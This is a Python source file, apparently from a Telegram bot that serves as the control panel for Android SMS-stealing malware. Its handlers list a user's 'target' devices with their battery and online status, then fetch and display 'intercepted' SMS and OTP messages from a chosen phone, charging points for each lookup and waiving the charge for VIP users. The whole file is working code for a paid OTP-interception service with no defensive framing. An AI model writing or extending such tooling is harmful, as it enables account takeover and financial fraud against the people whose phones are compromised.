import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes, ConversationHandler
from bot.models.user_model import update_user_points
from bot.models.settings_model import get_setting
from bot.services.firebase.fetch_devices import fetch_all_devices
from bot.services.firebase.fetch_sms import fetch_device_sms
from bot.middlewares.ban_check import ban_check
from bot.middlewares.points_check import points_required

from bot.middlewares.feature_toggle import feature_enabled
from bot.middlewares.rate_limit import rate_limit

logger = logging.getLogger(__name__)

# State constants for Receive SMS callback flows
CHOOSING_RECV_DEVICE = 1

@ban_check
@feature_enabled("f_recv_sms")
@points_required("receive_sms")
@rate_limit(cooldown_seconds=10)
async def start_receive_sms_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Renders devices list so user can choose which logs to inspect.
    """
    query = update.callback_query
    await query.answer()
    
    active_panel = context.user_data.get("active_panel")
    if not active_panel:
        keyboard = [[InlineKeyboardButton("📋 My Panels", callback_data="my_panels")],
                    [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_menu")]]
        await query.edit_message_text(
            "⚠️ **No Active Panel!**\n\nYou must select or add an active panel to extract incoming messages.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return ConversationHandler.END

    await query.edit_message_text("🔄 Querying database for registered devices...")
    
    devices = await fetch_all_devices(active_panel)
    if not devices:
        await query.edit_message_text(
            "⚠️ **No registered devices found on this panel!**\n\nEnsure your target device is configured.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back Menu", callback_data="back_to_menu")]])
        )
        return ConversationHandler.END

    text = "📥 **Message Interception Dock**\n\nSelect a target device to display lately captured SMS / OTPs:"
    keyboard = []
    
    for dev_id, dev_info in devices.items():
        if not isinstance(dev_info, dict):
            continue
        brand = dev_info.get("brand", "Generic Android Device")
        status = "🔴" if dev_info.get("status") == "offline" else "🟢"
        bat = dev_info.get("battery", "N/A")
        
        keyboard.append([InlineKeyboardButton(f"{status} {brand} (🔋 {bat})", callback_data=f"recvdev_{dev_id}")])
        
    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_sms")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    return CHOOSING_RECV_DEVICE

async def view_intercepted_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Fetches message payloads, renders them beautifully in Telegram, and charges standard points.
    """
    query = update.callback_query
    await query.answer()
    
    device_id = query.data.split("_")[1]
    active_panel = context.user_data.get("active_panel")
    user_id = query.from_user.id
    
    # Check points before making any query!
    cost = await get_setting("cost_receive_sms", 5)
    from bot.models.user_model import get_user
    user_record = await get_user(user_id)
    is_vip = user_record.get('is_vip', False) if user_record else False
    
    if not is_vip:
        new_bal = await update_user_points(user_id, -cost)
        if new_bal is None:
            await query.edit_message_text(f"🚫 **Insufficient Points!** You need {cost} points to read SMS.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back Menu", callback_data="back_to_menu")]]))
            return ConversationHandler.END
    
    await query.edit_message_text(f"📥 Loading latest transmissions from {device_id}...")
    
    messages = await fetch_device_sms(active_panel, device_id)
    if not messages:
        if not is_vip:
            await update_user_points(user_id, cost)
        await query.edit_message_text(
            f"ℹ️ **No intercepted texts found!**\n\nNo transmissions have been logged on device `{device_id}` yet.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="receive_sms")]])
        )
        return ConversationHandler.END
        
    # Sort messages by timestamp or keep as list
    sorted_messages = []
    for push_id, val in messages.items():
        if isinstance(val, dict):
            sorted_messages.append(val)
            
    # Sort descending based on timestamps (latest on top)
    try:
        sorted_messages.sort(key=lambda x: x.get("timestamp", 0), reverse=True)
    except Exception:
        pass
        
    text = f"📩 **OTP intercepts of Device:** `{device_id}`\n===============================\n\n"
    
    # Show top 5 messages to avoid hit bot limits
    for msg in sorted_messages[:5]:
        sender = msg.get("sender") or msg.get("ph") or "Unknown"
        body = msg.get("body") or msg.get("msg") or "No message body"
        
        # Handle time
        stamp = msg.get("timestamp") or msg.get("date")
        formatted_time = "N/A"
        if stamp:
            try:
                stamp_int = int(stamp)
                if stamp_int > 9999999999: # probably millis
                    stamp_int = stamp_int / 1000
                formatted_time = datetime.fromtimestamp(stamp_int).strftime('%Y-%m-%d %H:%M:%S')
            except Exception:
                formatted_time = str(stamp)
                
        text += (
            f"👤 **From:** `{sender}`\n"
            f"💬 **Message:** `{body}`\n"
            f"⏰ **Intercept Time:** `{formatted_time}`\n"
            f"-------------------------------\n"
        )
        
    if not is_vip:
        text += f"\n💳 Charged: **{cost} points**."
    
    keyboard = [[InlineKeyboardButton("⬅️ Back Menu", callback_data="back_to_menu")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    return ConversationHandler.END
